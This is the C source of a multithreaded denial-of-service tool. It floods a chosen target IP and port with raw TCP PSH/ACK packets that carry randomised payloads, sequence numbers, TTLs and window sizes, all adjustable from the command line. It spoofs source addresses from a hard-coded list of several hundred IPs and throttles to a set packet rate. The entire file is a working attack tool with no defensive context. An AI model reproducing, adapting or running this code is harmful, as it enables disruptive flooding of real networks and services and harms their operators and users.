#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAX_PAYLOAD_SIZE 1400
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

static const char PAYLOAD[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x5e\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\xb0\x7e\xb0\x53\x46\x5e";

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}
	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
	{
		sum += *(unsigned char *)buf;
	}

	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize)
{
	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	}

	pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = IPPROTO_TCP;
	pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
	unsigned short *tcp = malloc(totaltcp_len);
	if (!tcp)
	{
		perror("malloc failed");
		exit(-1);
	}
	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
	unsigned short output = csum(tcp, totaltcp_len);
	free(tcp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(PAYLOAD) - 1;
	iph->id = htonl(54321);
	iph->frag_off = htons(0x4000);
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr("127.0.0.1");
}

void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = htons(5678);
	tcph->check = 0;
	tcph->psh = 1;
	tcph->ack = 1;
	tcph->urg = 0;
	tcph->ack_seq = randnum(10000, 99999);
	tcph->urg_ptr = 0;
	tcph->window = htons(64240);
	tcph->doff = sizeof(struct tcphdr) / 4;
	memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, sizeof(PAYLOAD) - 1);
}

char *genPayload(int size)
{
	char *newPayload = (char *)malloc(size * sizeof(char));
	for (int i = 0; i < size; i++)
	{
		if (i % 2 == 0)
		{
			for (size_t num = 0; num < (i / 2); num++)
			{
				newPayload[num] = randnum(1, size);
				newPayload[i] = rand_cmwc() % (256 + num);
			}
		}
		else
		{
			newPayload[i] = randnum(1, size);
		}
	}

	// printf("Payload: %s\n", oldPayload);
	return newPayload;
}

void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (s < 0)
	{
		perror("Could not open raw socket");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	tcph->dest = htons(floodport);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		perror("Error: setsockopt() - Cannot set HDRINCL");
		exit(-1);
	}

	int src_ips[] = {
		2890377736,
		2890340610,
		1746734953,
		1746841604,
		2890245379,
		136146180,
		2890227716,
		2890342170,
		2890390307,
		2890327407,
		3324631309,
		2890177902,
		1746684943,
		2728380478,
		2890204436,
		2890195823,
		2728300660,
		2890284964,
		2728379442,
		2890364171,
		2728277302,
		2890183447,
		2890171149,
		1746742575,
		1745932296,
		2890140196,
		1745956874,
		2890268160,
		135554322,
		2890166290,
		1746697621,
		137102862,
		1746798639,
		1746753548,
		2372225828,
		1746685184,
		1746669612,
		2890051682,
		2890340423,
		2890238237,
		1746723378,
		137177933,
		135622405,
		1746722061,
		1745924096,
		2890096680,
		2728277511,
		2890383877,
		2890076203,
		135187504,
		1746025989,
		1746727481,
		2728334850,
		2890388542,
		2890362708,
		1746683186,
		2890146311,
		2728312067,
		2372224033,
		137101569,
		2890258186,
		2890117122,
		2728295434,
		1746741306,
		2890233443,
		3161612309,
		2728333343,
		2890393136,
		1746620422,
		1746695976,
		1746132992,
		2728305184,
		2890283796,
		2889900032,
		2890176526,
		1746206771,
		1746682395,
		2890324485,
		2890392593,
		2890334208,
		2728294941,
		2890280960,
		2890340864,
		2890175488,
		2890178649,
		2890212649,
		2890295832,
		2889934629,
		1746703902,
		135447112,
		2890172161,
		2890146683,
		1746714883,
		2890146848,
		2889884423,
		2890398761,
		1746157622,
		2890262599,
		2728331289,
		1746734599,
		136632420,
		2890358293,
		2890242337,
		2890209100,
		136846392,
		2728330509,
		1746697486,
		2890318850,
		136497408,
		2889965594,
		2890385700,
		1822621105,
		2890375455,
		136653576,
		2728382274,
		2890247172,
		2890220800,
		2890238320,
		2890164740,
		2890193408,
		2890141730,
		2890198275,
		2890330372,
		136632628,
		2890200585,
		2890278400,
		1746689282,
		1746678020,
		2890312966,
		2890266123,
		2890190688,
		1746707457,
		1746616320,
		2890304777,
		2889924631,
		2890218502,
		137262850,
		2890160137,
		1746762512,
		1746685710,
		2372231452,
		2890326786,
		2890226208,
		2890317834,
		2889915920,
		2728296451,
		2890302302,
		1746440215,
		1746708993,
		2890249989,
		2890372620,
		2889913094,
		1746083842,
		2890322180,
		2890373376,
		400768004,
		2890238806,
		2890359926,
		137178651,
		2890088452,
		135596556,
		1746092044,
		2890319926,
		1746706693,
		2890220077,
		2519760911,
		1746513971,
		2890205699,
		1746689033,
		1746366601,
		1746718982,
		2890211586,
		1746684944,
		2890213376,
		2890267970,
		2890392354,
		1745879156,
		137195296,
		1746694152,
		2890261529,
		2890002449,
		2728263687,
		2890237969,
		2890247687,
		2890342251,
		1746687792,
		2890387971,
		2890100788,
		1746362378,
		1746019182,
		1746798595,
		2890324238,
		2890183681,
		2890176519,
		136497154,
		2728390425,
		1746760966,
		2890176549,
		3340468284,
		1746362492,
		137067026,
		400762120,
		1746695467,
		1746206787,
		1746706432,
		1746715656,
		2890194177,
		2728350473,
		2889977919,
		2890160169,
		1746701618,
		2890197284,
		1822606081,
		1746739249,
		1746756096,
		2890395142,
		1746680834,
		2728312835,
		1746751042,
		3113397277,
		2728266754,
		1746604046,
		137397505,
		3324631665,
		2890224260,
		2890258705,
		2889912629,
		2890257929,
		135880708,
		1746682376,
		2728271402,
		1746841614,
		1746674180,
		2728320264,
		2728271879,
		1746696448,
		2890309387,
		2890364193,
		2728310789,
		2890395392,
		1746689869,
		1746723075,
		2890235658,
		1746686991,
		135597312,
		2734379527,
		1746755449,
		2890314768,
		1746676867,
		135187459,
		1746750823,
		2890334484,
		137093639,
		1738282499,
		2890330368,
		1746255892,
		2890373142,
		2890140464,
		1746727321,
		2889934349,
		2890214967,
		2890207518,
		3324637697,
		2728335123,
		1746695215,
		1746473072,
		2890250241,
		2890146875,
		2890266687,
		2890308683,
		137066832,
		1746689167,
		1822606900,
		2890376983,
		1746711562,
		2890334978,
		2890279684,
		135852900,
		2890043393,
		2728322051,
		136825672,
		2372229637,
		2890313987,
		1746149401,
		1746759168,
		1745891356,
		1746691882,
		2890231555,
		1746726659,
		2728285184,
		1746231340,
		135559694,
		2890281991,
		2728278018,
		2890333440,
		2890187531,
		2890335235,
		2890264320,
		2890372359,
		2728299016,
		1746734848,
		2728273780,
		2890237234,
		1746485295,
		1746711813,
		137011540,
		1746714443,
		2890255877,
		2890141010,
		2890231582,
		2728313354,
		136526099,
		2728272140,
		1746740232,
		1746688770,
		1746724914,
		2890279685,
		2890156037,
		2728293128,
		1822612515,
		1746407431,
		2890290526,
		2890181689,
		2728328962,
		2890227305,
		2890237472,
		2890357275,
		2890171431,
		2890204473,
		2728268853,
		2728337484,
		2890391816,
		2890335549,
		2890170369,
		1746866791,
		2890251793,
		1746729555,
		2890395940,
		1746599948,
		2890333704,
		2890358611,
		2728331022,
		2890395666,
		2890222851,
		1746137094,
		136176646,
		2890187566,
		135384582,
		137117204,
		1746674441,
		1746681641,
		137102917,
		2890252043,
		2889892897,
		1822619195,
		2890363393,
		2890236933,
		137262892,
		137301122,
		1746698752,
		2890371075,
		2890221313,
		1746687780,
		1746746113,
		2728345654,
		2890261770,
		2890393385,
		2890139944,
		2890387732,
		2728325177,
		1746010121,
		2889915407,
		2890204686,
		1746025991,
		1746734858,
		2890169346,
		1746744156,
		2890175492,
		2890259986,
		2889915482,
		1746667271,
		2728344617,
		2890247936,
		2890317095,
		1746739101,
		136497195,
		2890244405,
		2889884217,
		1746682649,
		137116167,
		2890221395,
		2890187264,
		2890332424,
		2728311672,
		1746620416,
		2890139904,
		1822611969,
		1746714896,
		2890206763,
		2890163249,
		2890156075,
		2890355975,
		2890223897,
		2889900059,
		2890164240,
		2890043405,
		1822618368,
		1746025484,
		2890260766,
		2728322862,
		2890259969,
		1746744663,
		2890167809,
		1746019456,
		2890200839,
		2890360356,
		2889986051,
		2889981959,
		2890145949,
		1746025730,
		2728292150,
		1746697310,
		2890341122,
		1746866691,
		136825873,
		2728380164,
		2890341380,
		136906241,
		2890137703,
		2728267330,
		2890376456,
		2890313589,
		2890170894,
		1746672384,
		137032999,
		2070694660,
		1746752045,
		2890159386,
		2728379952,
		2728305247,
		3340468227,
		1746698496,
		2890323577,
		2728299023,
		1746683653,
		3113397504,
		1746210822,
		2890363658,
		2890385408,
		2890154246,
		2728306959,
		2728269095,
		2890080286,
		2890325845,
		1746719235,
		2890173985,
		2890246808,
		2728341547,
		1746112580,
		1822612039,
		1746672390,
		1746693462,
		2890233166,
		136464203,
		2728294188,
		137262523,
		2728381964,
		137192448,
		2890205184,
		1822611555,
		2890360392,
		1746022914,
		136846344,
		1746735623,
		2890189691,
		2728380682,
		1746019620,
		2890373640,
		2728381712,
		1746448407,
		2890173185,
		2372226049,
		2890255659,
		136653568,
		137195290,
		2728378882,
		3324630115,
		2728334341,
		1746019352,
		2890373133,
		3324624897,
		1746749963,
		136847104,
		2890195999,
		2890224640,
		2890247507,
		2890305290,
		137117320,
		2890147328,
		1746758160,
		136846081,
		1746679891,
		2890160666,
		2890240256,
		2890301022,
		2728312840,
		2890371886,
		3161614986,
		3324631308,
		2890144263,
		2890354695,
		2890305043,
		2890291987,
		137315657,
		2728264960,
		2728313656,
		135554194,
		2890298247,
		1746670644,
		1746759169,
		2890208054,
		2890220586,
		1746727209,
		2728304900,
		2890384645,
		2890236160,
		2890373126,
		1746710549,
		2890320669,
		2372234536,
		1746223153,
		3112457729,
		2728322818,
		2728314118,
		2890148617,
		2890194207,
		1746711320,
		2890391096,
		2890261505,
		2890166809,
		1746366468,
		2728340062,
		2889953284,
		1745977354,
		2918528607,
		1746718977,
		2890384172,
		2890236680,
		2728299577,
		1746712342,
		2890334725,
		2890316822,
		2728306179,
		1746743056,
		2890281740,
		1746731305,
		2890264603,
		136745987,
		1746727694,
		2889934596,
		1746752783,
		2890314502,
		1746713620,
		2889913425,
		137014319,
		1746731837,
		1746730498,
		2890382901,
		1746128987,
		2890391366,
		1746264147,
		137177857,
		1746749210,
		2728313435,
		2728312901,
		2890185225,
		2890398209,
		1746729261,
		136846857,
		2890190080,
		2372231938,
		2890250764,
		2890212352,
		1746720276,
		2890196494,
		2890166278,
		2728323916,
		1746149404,
		135410302,
		1746608132,
		2890399502,
		2890371338,
		1746752775,
		2372230444,
		2890189858,
		2890316643,
		1746755592};

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while (1)
	{

		int randomPayloadLength = randnum(32, 512) - 1;
		char *randomPayload = genPayload(randomPayloadLength);
		/*		char randomPayload[randomPayloadLength];

		for (int i = 0; i < randomPayloadLength; i++)
		{
			randomPayload[i] = rand_cmwc() % 256; // Do not change that bruh
		}*/
		memcpy((void *)tcph + sizeof(struct tcphdr), randomPayload, randomPayloadLength);
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomPayloadLength;
		iph->check = csum((unsigned short *)datagram, iph->tot_len);
		tcph->check = 0;
		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
		tcph->doff = sizeof(struct tcphdr) / 4;
		tcph->dest = htons(floodport);
		iph->ttl = randnum(64, 128);
		iph->saddr = htonl(src_ips[rand_cmwc() % (sizeof(src_ips) / sizeof(src_ips[0]))]);
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->dest = htons(floodport);
		tcph->check = tcpcsum(iph, tcph, randomPayloadLength);

		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		{
			perror("Error: sendto failed");
		}

		int windows[3] = {8192, 64240, 65535};
		int ctos[3] = {0, 40, 72};
		iph->tos = ctos[randnum(0, 2)];
		tcph->window = htons(windows[randnum(0, 2)]);
		pps++;
		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}

		i++;
	}
}

int main(int argc, char *argv[])
{
	if (argc < 6)
	{
		fprintf(stderr, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	srand((unsigned int)time(NULL));
	fprintf(stdout, "Setting up Sockets...\n");
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	int multiplier = 12;
	int i;

	for (i = 0; i < num_threads; i++)
	{
		if (pthread_create(&thread[i], NULL, &flood, (void *)argv[1]) != 0)
		{
			perror("Error: pthread_create failed");
			exit(-1);
		}
	}

	fprintf(stdout, "Starting Flood...\n");
	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else
			{
				limiter--;
			}
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else
			{
				sleeptime = 0;
			}
		}

		pps = 0;
	}

	return 0;
}
